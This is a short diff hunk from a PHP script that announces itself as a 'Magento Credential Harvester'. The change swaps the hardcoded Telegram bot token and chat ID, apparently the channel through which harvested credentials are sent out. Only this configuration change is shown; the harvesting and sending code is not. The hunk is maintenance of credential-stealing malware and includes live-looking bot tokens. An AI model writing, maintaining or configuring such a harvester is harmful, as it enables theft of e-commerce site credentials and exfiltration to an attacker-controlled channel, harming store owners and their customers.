@@ -21,8 +21,8 @@ echo "Starting Magento Credential Harvester...\n";
 // ============================================
 // TELEGRAM CONFIG (Hardcoded)
 // ============================================
-$tg_bot_token = '8434935750:AAEzRdUUXxQWlLosrbLmVgYNMN--8anMzNQ';
-$tg_chat_id = '-5057844746';
+$tg_bot_token = '8445993776:AAGOvop7i91Qrigh9WfP63SSvh9Z2RIn0xQ';
+$tg_chat_id = '919145765';
 
 // ============================================
 // TELEGRAM SEND FUNCTION
